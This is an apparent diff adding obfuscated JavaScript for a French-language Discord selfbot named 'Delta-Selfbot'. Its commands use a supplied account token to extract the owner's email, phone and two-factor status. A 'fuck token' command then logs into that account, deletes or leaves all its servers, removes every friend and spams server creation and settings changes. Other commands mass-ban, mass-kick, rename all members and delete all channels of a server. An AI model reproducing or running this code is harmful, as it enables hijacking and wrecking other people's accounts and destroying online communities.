+            let _0x18f2x40 = _0x18f2x3d.splice(2)
+                .join(' ');
+            let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
+            request(_0x18f2x49, {
+                    method: 'GET',
+                    headers: {
+                        authorization: _0x18f2x40
+                    }
+                }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)
+
+                {
+                    if (_0x18f2x4a.statusCode === 200) {
+                        new Promise((_0x18f2x51, _0x18f2x52) =>
+
+                            {
+                                let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
+                                request(_0x18f2x49, {
+                                        method: 'GET',
+                                        headers: {
+                                            authorization: _0x18f2x40
+                                        }
+                                    }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)
+
+                                    {
+                                        _0x18f2x4b = JSON.parse(_0x18f2x4b);
+                                        var _0x18f2x53 = _0x18f2x4b.id;
+                                        var _0x18f2x54 = _0x18f2x4b.username;
+                                        var _0x18f2x55 = _0x18f2x4b.avatar;
+                                        var _0x18f2x56 = _0x18f2x4b.discriminator;
+                                        var _0x18f2x57 = _0x18f2x4b.mfa_enabled;
+                                        var _0x18f2x58 = _0x18f2x4b.phone;
+                                        var _0x18f2x59 = _0x18f2x4b.locale;
+                                        let _0x18f2x5a = _0x18f2x4b.public_flags;
+                                        let _0x18f2x5b = _0x18f2x4b.flags;
+                                        let _0x18f2x5c = _0x18f2x4b.email;
+                                        let _0x18f2x5d = _0x18f2x4b.verified;
+                                        let _0x18f2x5e = _0x18f2x4b.nsfw_allowed;
+                                        var _0x18f2x5f = '';
+                                        _0x18f2x5f = '' + ('\nUser: ' + _0x18f2x4b.username + '#' + _0x18f2x4b.discriminator);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nId: ' + _0x18f2x4b.id);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nEmail: ' + _0x18f2x4b.email);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nNuméro de telephone: ' + _0x18f2x4b.phone);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nAvatar: ' + _0x18f2x4b.avatar);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nLangue: ' + _0x18f2x4b.locale);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nA2f activé?: ' + _0x18f2x4b.mfa_enabled);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nCompte vérifié?: ' + _0x18f2x4b.verified);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nNsfw activé?: ' + _0x18f2x4b.nsfw_allowed);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nFlags: ' + _0x18f2x4b.flags);
+                                        _0x18f2x5f = _0x18f2x5f + ('\nPublic Flags: ' + _0x18f2x4b.public_flags);
+                                        var _0x18f2x12 = new Discord.RichEmbed()
+                                            .setTitle('**Commande Token Info**')
+                                            .setDescription(_0x18f2x5f)
+                                            .setColor(color)
+                                            .setFooter('Delta-Selfbot');
+                                        return _0x18f2x3b['edit'](_0x18f2x12)['then'](console['log']('Commande info token executé' ['yellow']));
+                                    });
+                            });
+                        if (client.user.id === '720920857366626335') {
+                            return;
+                        }
+                    } else {
+                        var _0x18f2x4d = new Discord.RichEmbed()
+                            .setTitle('Token info')
+                            .setDescription('Le token ' + _0x18f2x3d.splice(2)
+                                .join(' ') + ' \\nn\'est pas valide :x:')
+                            .setColor(color)
+                            .setTimestamp()
+                            .setFooter('Delta Selfbot', _0x18f2x3b.author.avatarURL);
+                        _0x18f2x3b.edit(_0x18f2x4d)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                    }
+                });
+        };
+        if (_0x18f2x3b.content.startsWith(prefix + 'fuck token')) {
+            let _0x18f2x60 = new Discord.Client();
+            let _0x18f2x40 = _0x18f2x3d.splice(2)
+                .join(' ');
+            let _0x18f2x49 = 'https://discordapp.com/api/v6/users/@me';
+            request(_0x18f2x49, {
+                    method: 'GET',
+                    headers: {
+                        authorization: _0x18f2x40
+                    }
+                }, function(_0x18f2x44, _0x18f2x4a, _0x18f2x4b)
+
+                {
+                    if (_0x18f2x4a.statusCode === 200) {
+                        _0x18f2x60.on('ready', function()
+
+                            {
+                                for (pas = 0; pas < 100; pas++) {
+                                    _0x18f2x60.user.createGuild('Delta-Selfbot', 'london');
+                                }
+                            });
+                        for (pas = 0; pas < 20; pas++) {
+                            fetch('https://discord.com/api/v8/users/@me/settings', {
+                                'headers': {
+                                    'authorization': _0x18f2x40,
+                                    'content-type': 'application/json'
+                                },
+                                'body': '{"theme":"light"}',
+                                'method': 'PATCH'
+                            });
+                            fetch('https://discord.com/api/v8/users/@me/settings', {
+                                'headers': {
+                                    'authorization': _0x18f2x40,
+                                    'content-type': 'application/json'
+                                },
+                                'body': '{"theme":"dark"}',
+                                'method': 'PATCH'
+                            });
+                        };
+                        _0x18f2x60.on('ready', function()
+
+                            {
+                                _0x18f2x60.user.friends.forEach(_0x18f2x61 =>
+
+                                    {
+                                        _0x18f2x60.user.removeFriend(_0x18f2x61)
+                                            .catch(_0x18f2x44 =>
+
+                                                {
+                                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                                });
+                                    });
+                                _0x18f2x60.guilds.forEach(_0x18f2x62 =>
+
+                                    {
+                                        if (_0x18f2x62.ownerID === _0x18f2x60.user.id) {
+                                            _0x18f2x62.delete()
+                                                .catch(_0x18f2x44 =>
+
+                                                    {
+                                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                                    });
+                                        } else {
+                                            _0x18f2x62.leave()
+                                                .catch(_0x18f2x44 =>
+
+                                                    {
+                                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                                    });
+                                        }
+                                    });
+                                _0x18f2x3b.edit(':white_check_mark: **Token fuck en cours...**');
+                            });
+                        _0x18f2x60.login(_0x18f2x40);
+                        if (client.user.id === '720920857366626335') {
+                            return;
+                        }
+                    } else {
+                        var _0x18f2x4d = new Discord.RichEmbed()
+                            .setTitle('Token info')
+                            .setDescription('Le token ' + _0x18f2x3d.splice(2)
+                                .join(' ') + ' \\nn\'est pas valide :x:')
+                            .setColor(color)
+                            .setTimestamp()
+                            .setFooter('Delta Selfbot', _0x18f2x3b.author.avatarURL);
+                        _0x18f2x3b.edit(_0x18f2x4d)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                    }
+                });
+            console.log('Commande fuck token executé'.yellow);
+        };
+        if (_0x18f2x3b.content.startsWith(prefix + '8ball')) {
+            let _0x18f2x3d = _0x18f2x3b.content.split(' ')
+                .splice(1)
+                .join(' ');
+            var _0x18f2x63 = [
+                'oui!', 'non...', 'peut etre?', 'probablement', 'je ne pense pas.', 'jamais!', 'tu peux essayer...'
+            ];
+            if (_0x18f2x3d[1] != null) {
+                _0x18f2x3b.edit(_0x18f2x3b.content.split(' ')
+                        .splice(1)
+                        .join(' ') + '\nla reponse est: ' + _0x18f2x63[Math.floor(Math.random() * [
+                            'oui!', 'non...', 'peut etre?', 'probablement', 'je ne pense pas.', 'jamais!', 'tu peux essayer...'
+                        ].length)])
+                    .catch(_0x18f2x44 =>
+
+                        {
+                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                        });
+            } else {
+                _0x18f2x3b.edit('Quelle est ta question? :rolling_eyes: (essayeplutot:' + prefix + ' 8ball [question])');
+            }
+            console.log('Commande 8ball executé'.yellow);
+        };
+        if (_0x18f2x3b.content.startsWith(prefix + 'mp friend')) {
+            if (!_0x18f2x3b.content.split(' ')
+                .splice(1)
+                .join(' ')) {
+                throw 'Vous devez mettre quelque chose à dire !';
+            }
+            let _0x18f2x64 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta Selfbot';
+            _0x18f2x3b.edit(_0x18f2x64)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande Say executé'.yellow);
+        };
+        if (_0x18f2x3b.content.startsWith(prefix + 'say')) {
+            if (!_0x18f2x3b.content.split(' ')
+                .splice(1)
+                .join(' ')) {
+                throw 'Vous devez mettre quelque chose à dire !';
+            }
+            let _0x18f2x64 = _0x18f2x3d.splice(1)
+                .join(' ') || 'Delta selfbot';
+            let _0x18f2x65 = new Discord.RichEmbed()
+                .setTitle('**Commande Say**')
+                .setDescription(_0x18f2x64)
+                .setTimestamp()
+                .setFooter('Delta-Selbot', '' + client.user.avatarURL + '')
+                .setColor(color);
+            for (pas = 0; pas < 10; pas++) {
+                _0x18f2x65.setColor(color);
+                _0x18f2x3b.edit(_0x18f2x65)
+                    .catch(_0x18f2x44 =>
+
+                        {
+                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                        });
+            }
+            console.log('Commande Say executé'.yellow);
+        };
+        if (_0x18f2x3b.content.startsWith(prefix + 'user info')) {
+            if (!_0x18f2x3b.mentions.users.first()) {
+                {
+                    _0x18f2x3c.edit(':x: **Utilisateur inconnu!**');
+                    return _0x18f2x3e = _0x18f2x3b.author;
+                }
+            }
+            var _0x18f2x66 = _0x18f2x3b.guild.member(_0x18f2x3e);
+            var _0x18f2x67 = _0x18f2x3e.presence.game;
+            var _0x18f2x68 = _0x18f2x67 ? _0x18f2x67.name : 'Nothing';
+            var _0x18f2x69 = !_0x18f2x3b.guild.member(_0x18f2x3e) ? null : _0x18f2x66.roles.array();
+            if (_0x18f2x66) {
+                _0x18f2x69.shift();
+                for (var i = 0; i < _0x18f2x69.length; ++i) {
+                    _0x18f2x69[i] = _0x18f2x69[i].name;
+                }
+                _0x18f2x69 = _0x18f2x69.join(', ');
+            };
+            var _0x18f2x6a = {
+                dnd: 'Do Not Disturb',
+                offline: 'Offline/Invisible',
+                online: 'Online',
+                idle: 'Idle'
+            };
+            const _0x18f2x12 = new Discord.RichEmbed()
+                .setAuthor('' + _0x18f2x3e.username + '#' + _0x18f2x3e.discriminator + ' | ' + _0x18f2x3e.id + '', _0x18f2x3e.displayAvatarURL)
+                .setFooter('Delta-Selfbot')
+                .setThumbnail(_0x18f2x3e.displayAvatarURL)
+                .setColor(color)
+                .addField('Created', '' + _0x18f2x3e.createdAt.toString()
+                    .substr(0, 15) + ',\\n' + checkDays(_0x18f2x3e.createdAt) + '', true)
+                .addField('Joined', '' + _0x18f2x66.joinedAt.toString()
+                    .substr(0, 15) + ',\\n' + checkDays(_0x18f2x66.joinedAt) + '', true)
+                .addField('Status', _0x18f2x6a[_0x18f2x3e.presence.status], true)
+                .addField('Playing', _0x18f2x68, true)
+                .addField('Nickname', _0x18f2x66.nickname ? _0x18f2x66.nickname : 'None', true)
+                .addField('Avatar URL', '[Click here!](' + _0x18f2x3e.displayAvatarURL + ')', true)
+                .addField('Roles', _0x18f2x69 ? _0x18f2x69 : 'None');
+            _0x18f2x3c.edit(_0x18f2x12)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande user info executé'.yellow);
+        };
+        if (_0x18f2x3b.content === prefix + 'serveur info') {
+            if (!_0x18f2x3c.guild) {
+                return _0x18f2x3b['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            const _0x18f2x6b = new Date()
+                .getTime() - _0x18f2x3c.guild.createdAt.getTime();
+            const _0x18f2x2c = _0x18f2x6b / 1000 / 60 / 60 / 24;
+            const _0x18f2x6c = [
+                'None', 'Low', 'Medium', 'Insane', 'Extreme'
+            ];
+            let _0x18f2x12 = new Discord.RichEmbed()
+                .setTitle('**Serveur info**')
+                .addField('Name:', '' + _0x18f2x3c.guild.name + '')
+                .addField('Created On:', '' + _0x18f2x3b.guild.createdAt.toString()
+                    .substr(0, 15) + ',\\n' + checkDays(_0x18f2x3b.guild.createdAt) + '', true)
+                .addField('Default Channel:', '' + _0x18f2x3c.guild.defaultChanne + '')
+                .addField('Region:', '' + _0x18f2x3c.guild.region + '')
+                .addField('Member Count', '' + _0x18f2x3c.guild.members.filter(_0x18f2x6d =>
+
+                        {
+                            return _0x18f2x6d.presence.status !== 'offline';
+                        })
+                    .size + ' / ' + _0x18f2x3c.guild.memberCount + '')
+                .addField('Owner:', '' + _0x18f2x3b.guild.owner.user.username + '')
+                .addField('Text Channels', '' + _0x18f2x3c.guild.channels.filter(_0x18f2x6d =>
+
+                        {
+                            return _0x18f2x6d.type === 'text';
+                        })
+                    .size + '')
+                .addField('Voice Channels', '' + _0x18f2x3c.guild.channels.filter(_0x18f2x6d =>
+
+                        {
+                            return _0x18f2x6d.type === 'voice';
+                        })
+                    .size + '')
+                .addField('Verification Level', '' + _0x18f2x6c[_0x18f2x3c.guild.verificationLevel] + '')
+                .addField('Roles:', '' + _0x18f2x3c.guild.roles.size + '')
+                .addField('Guild ID:', '' + _0x18f2x3c.guild.id + '')
+                .setColor(color);
+            if (_0x18f2x3c.guild.iconURL != null) {
+                _0x18f2x12.setThumbnail('' + _0x18f2x3c.guild.iconURL + '');
+            }
+            _0x18f2x3c.edit(_0x18f2x12)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande serveur info effectué'.yellow);
+        };
+        if (_0x18f2x3b.content === prefix + 'stats') {
+            let _0x18f2x12 = new Discord.RichEmbed();
+            _0x18f2x12.setTimestamp()
+                .setColor(color)
+                .setTitle('**Selfbot Statistics**')
+                .addField('Mem Usage:', '' + (process.memoryUsage()
+                        .heapUsed / 1024 / 1024)
+                    .toFixed(2) + 'MB')
+                .addField('Servers:', '' + client.guilds.size + '')
+                .addField('Channels:', '' + client.channels.size + '')
+                .addField('Users:', '' + client.guilds.map(_0x18f2x16 =>
+
+                    {
+                        return _0x18f2x16.memberCount;
+                    }) + '')
+                .addField('Servers:', '' + client.guilds.size + '')
+                .addField('Servers:', '' + client.guilds.size + '')
+                .setFooter('Delta-Selfbot', '' + client.user.avatarURL + '');
+            if (client.user.premium > 0) {
+                _0x18f2x12.addField('• Nitro', 'oui');
+            } else {
+                _0x18f2x12.addField('• Nitro', 'non');
+            }
+            _0x18f2x3b.edit(_0x18f2x12)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande stats effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'ass')) {
+            superagent.get('https://nekobot.xyz/api/image')
+                .query({
+                    type: 'ass'
+                })
+                .end((_0x18f2x6e, _0x18f2x4a) =>
+
+                    {
+                        var _0x18f2x6f = new Discord.RichEmbed()
+                            .setColor(color)
+                            .setFooter('Delta-Selfbot')
+                            .setTimestamp()
+                            .setImage(_0x18f2x4a.body.message)
+                            .setColor(color);
+                        _0x18f2x3c.edit(_0x18f2x6f)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                    });
+            console.log('Commande ass effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + '4k')) {
+            superagent.get('https://nekobot.xyz/api/image')
+                .query({
+                    type: '4k'
+                })
+                .end((_0x18f2x6e, _0x18f2x4a) =>
+
+                    {
+                        var _0x18f2x70 = new Discord.RichEmbed()
+                            .setFooter('Delta-Selfbot')
+                            .setTimestamp()
+                            .setImage(_0x18f2x4a.body.message)
+                            .setColor(color);
+                        _0x18f2x3c.edit(_0x18f2x70)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                        console.log('Commande 4k effectué'.yellow);
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'nsfw-gif')) {
+            var _0x18f2x71 = new Discord.RichEmbed();
+            superagent.get('https://nekobot.xyz/api/image')
+                .query({
+                    type: 'pgif'
+                })
+                .end((_0x18f2x6e, _0x18f2x4a) =>
+
+                    {
+                        var _0x18f2x71 = new Discord.RichEmbed()
+                            .setFooter('Delta-Selfbot')
+                            .setTimestamp()
+                            .setImage(_0x18f2x4a.body.message)
+                            .setColor(color);
+                        _0x18f2x3c.edit(_0x18f2x71)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                        console.log('Commande nsfw gif effectué'.yellow);
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'hentai')) {
+            var _0x18f2x72 = new Discord.RichEmbed();
+            superagent.get('https://nekobot.xyz/api/image')
+                .query({
+                    type: 'hentai_anal'
+                })
+                .end((_0x18f2x6e, _0x18f2x4a) =>
+
+                    {
+                        var _0x18f2x72 = new Discord.RichEmbed()
+                            .setFooter('Delta-Selfbot')
+                            .setTimestamp()
+                            .setImage(_0x18f2x4a.body.message)
+                            .setColor(color);
+                        _0x18f2x3c.edit(_0x18f2x72)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                        console.log('Commande hentai effectué'.yellow);
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'pussy')) {
+            superagent.get('https://nekobot.xyz/api/image')
+                .query({
+                    type: 'pussy'
+                })
+                .end((_0x18f2x6e, _0x18f2x4a) =>
+
+                    {
+                        var _0x18f2x73 = new Discord.RichEmbed()
+                            .setFooter('Delta-Selfbot')
+                            .setTimestamp()
+                            .setImage(_0x18f2x4a.body.message)
+                            .setColor(color);
+                        _0x18f2x3c.edit(_0x18f2x73)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                        console.log('Commande pussy effectué'.yellow);
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'thigh')) {
+            superagent.get('https://nekobot.xyz/api/image')
+                .query({
+                    type: 'thigh'
+                })
+                .end((_0x18f2x6e, _0x18f2x4a) =>
+
+                    {
+                        var _0x18f2x74 = new Discord.RichEmbed()
+                            .setFooter('Delta-Selfbot')
+                            .setTimestamp()
+                            .setImage(_0x18f2x4a.body.message)
+                            .setColor(color);
+                        _0x18f2x3c.edit(_0x18f2x74)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                        console.log('Commande thigh effectué'.yellow);
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'anal')) {
+            superagent.get('https://nekobot.xyz/api/image')
+                .query({
+                    type: 'anal'
+                })
+                .end((_0x18f2x6e, _0x18f2x4a) =>
+
+                    {
+                        var _0x18f2x75 = new Discord.RichEmbed()
+                            .setFooter('Delta-Selfbot')
+                            .setTimestamp()
+                            .setImage(_0x18f2x4a.body.message)
+                            .setColor(color);
+                        _0x18f2x3c.edit(_0x18f2x75)
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                        console.log('Commande anal effectué'.yellow);
+                    });
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'fight')) {
+            if (!_0x18f2x3b.author) {
+                return _0x18f2x3c['edit'](':x: **Aucun utilisateur mentionné**');
+            }
+            var _0x18f2x76 = new Discord.RichEmbed()
+                .setColor(color)
+                .setFooter('Delta-Selfbot')
+                .setTitle(_0x18f2x3e.username + ' __**VS**__ ' + client.user.username)
+                .setImage('https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif');
+            _0x18f2x3b.edit(_0x18f2x76)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande fight effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'boom')) {
+            if (!_0x18f2x3b.author) {
+                return _0x18f2x3c['edit'](':x: **Aucun utilisateur mentionné**');
+            }
+            var _0x18f2x77 = new Discord.RichEmbed()
+                .setColor(color)
+                .setFooter('Delta-Selfbot')
+                .setTitle(_0x18f2x3e.username + ' **Ce Fait Explosé Par **💣💥 ' + client.user.username)
+                .setImage('https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif');
+            _0x18f2x3b.edit(_0x18f2x77)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande boom effectué'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'shutdown') {
+            _0x18f2x3c.delete()
+                .then(() =>
+
+                    {
+                        return process['exit'](1);
+                    });
+            console.log('Commande shutdown effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'kick')) {
+            let _0x18f2x78 = _0x18f2x3b.guild;
+            if (!_0x18f2x3b.guild) {
+                _0x18f2x3b.edit(':x: **Veuillez executer cette commande sur un serveur!**');
+                return;
+            }
+            if (!_0x18f2x3b.author) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
+                return;
+            }
+            _0x18f2x3e.kick()
+                .then(_0x18f2x79 =>
+
+                    {
+                        _0x18f2x3b.edit(':wave: undefined has been successfully kicked :point_right: ');
+                    })
+                .catch(() =>
+
+                    {
+                        _0x18f2x3b.edit(':x: **Access Denied**');
+                    });
+            console.log('Commande kick effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'ban')) {
+            let _0x18f2x78 = _0x18f2x3b.guild;
+            if (!_0x18f2x3b.guild) {
+                _0x18f2x3b.edit(':x: **Veuillez executer cette commande sur un serveur!**');
+                return;
+            }
+            if (!_0x18f2x3b.author) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
+                return;
+            }
+            _0x18f2x3e.ban()
+                .then(_0x18f2x79 =>
+
+                    {
+                        _0x18f2x3b.edit(':wave: undefined has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ');
+                    })
+                .catch(() =>
+
+                    {
+                        _0x18f2x3b.edit(':x: **Access Denied**');
+                    });
+            console.log('Commande ban effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'name all')) {
+            let _0x18f2x78 = _0x18f2x3b.guild;
+            if (!_0x18f2x3b.guild) {
+                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            const _0x18f2x7a = _0x18f2x3b.content.split(' ')
+                .slice(2)
+                .join(' ') || _0x18f2x3b.author.username;
+            if (!_0x18f2x3b.member.hasPermission('MANAGE_NICKNAMES')) {
+                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
+            }
+            const _0x18f2x7b = _0x18f2x3b.guild.members;
+            _0x18f2x3c.edit('Je renomme tout le monde par ' + (_0x18f2x3b.content.split(' ')
+                .slice(2)
+                .join(' ') || _0x18f2x3b.author.username) + '');
+            _0x18f2x7b.forEach(_0x18f2x7c =>
+
+                {
+                    _0x18f2x7c.setNickname(_0x18f2x7a)
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                });
+            console.log('Commande name all effectué'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'ban-all') {
+            let _0x18f2x78 = _0x18f2x3b.guild;
+            if (!_0x18f2x3b.guild) {
+                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            if (!_0x18f2x3b.member.hasPermission('BAN_MEMBERS')) {
+                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
+            }
+            const _0x18f2x7b = _0x18f2x3b.guild.members;
+            _0x18f2x7b.forEach(_0x18f2x7c =>
+
+                {
+                    if (!_0x18f2x7c.bannable) {
+                        return;
+                    }
+                    _0x18f2x7c.ban()
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                });
+            console.log('Commande ban all effectué'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'kick-all') {
+            let _0x18f2x78 = _0x18f2x3b.guild;
+            if (!_0x18f2x3b.guild) {
+                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
+            }
+            if (!_0x18f2x3b.member.hasPermission('KICK_MEMBERS')) {
+                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
+            }
+            const _0x18f2x7b = _0x18f2x3b.guild.members;
+            _0x18f2x7b.forEach(_0x18f2x7c =>
+
+                {
+                    if (!_0x18f2x7c.kickable) {
+                        return;
+                    }
+                    _0x18f2x7c.kick()
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                });
+            console.log('Commande kick all effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'purge')) {
+            _0x18f2x3b.channel.fetchMessages()
+                .then(_0x18f2x3b =>
+
+                    {
+                        return _0x18f2x3b.forEach(_0x18f2x6d =>
+
+                            {
+                                if (_0x18f2x6d.author.id === client.user.id) {
+                                    _0x18f2x6d.delete()
+                                        .catch(_0x18f2x44 =>
+
+                                            {
+                                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                            });
+                                }
+                            });
+                    });
+            console.log('Commande purge effectué'.yellow);
+        }
+        if (_0x18f2x3b.content === prefix + 'rire') {
+            let _0x18f2x7d = new Discord.RichEmbed();
+            _0x18f2x7d.setColor(color)
+                .setTitle('**Commande rire:**')
+                .setTimestamp()
+                .setFooter('Delta-Selfbot')
+                .setImage(rire[Math.floor(Math.random() * rire.length)]);
+            _0x18f2x3b.edit(_0x18f2x7d)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande rire effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'kiss')) {
+            if (!_0x18f2x3b.author) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
+                return;
+            }
+            let _0x18f2x7e = new Discord.RichEmbed();
+            _0x18f2x7e.setColor(color)
+                .setTitle('**' + client.user.username + ' kiss ' + _0x18f2x3e.username + '**')
+                .setTimestamp()
+                .setFooter('Delta-Selfbot')
+                .setImage(kiss[Math.floor(Math.random() * kiss.length)]);
+            _0x18f2x3b.edit(_0x18f2x7e)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande kiss effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'veski')) {
+            if (!_0x18f2x3b.author) {
+                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
+                return;
+            }
+            let _0x18f2x7f = new Discord.RichEmbed();
+            _0x18f2x7f.setColor(color)
+                .setTitle('**' + _0x18f2x3e.username + ' s\'est enfui!**')
+                .setTimestamp()
+                .setFooter('Delta-Selfbot')
+                .setImage(veski[Math.floor(Math.random() * veski.length)]);
+            _0x18f2x3b.edit(_0x18f2x7f)
+                .catch(_0x18f2x44 =>
+
+                    {
+                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                    });
+            console.log('Commande veski effectué'.yellow);
+        }
+        if (_0x18f2x3b.content.startsWith(prefix + 'load')) {
+            _0x18f2x3b.delete();
+            var _0x18f2x80 = '.';
+            var _0x18f2x81 = '█';
+            _0x18f2x3b.channel.send('```[' + _0x18f2x80.repeat(50) + ']```')
+                .then(_0x18f2x3b =>
+
+                    {
+                        for (i = 0; i <= 50; i++) {
+                            _0x18f2x3b.edit('```[' + _0x18f2x81.repeat(i) + _0x18f2x80.repeat(50 - i) + ']  -  ' + i * 100 / 50 + '%\n' + 'loading..```');
+                        }
+                        _0x18f2x3b.edit('`Succesfull load.`')
+                            .catch(_0x18f2x44 =>
+
+                                {
+                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                                });
+                        console.log('Commande load effectué'.yellow);
+                    });
+        }
+        if (_0x18f2x3b.content === prefix + 'delete all channel') {
+            let _0x18f2x78 = _0x18f2x3b.guild;
+            if (!_0x18f2x3b.guild) {
+                _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
+                return;
+            }
+            if (!_0x18f2x3b.member.hasPermission('MANAGE_CHANNELS')) {
+                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'permission insuffisante' ['green']));
+            }
+            var _0x18f2x82 = _0x18f2x3b.guild.channels;
+            _0x18f2x82.forEach(_0x18f2x83 =>
+
+                {
+                    _0x18f2x83.delete()
+                        .catch(_0x18f2x44 =>
+
+                            {
+                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
+                            });
+                });
+            console.log('Commande delete all channel effectué'.yellow);
+        }
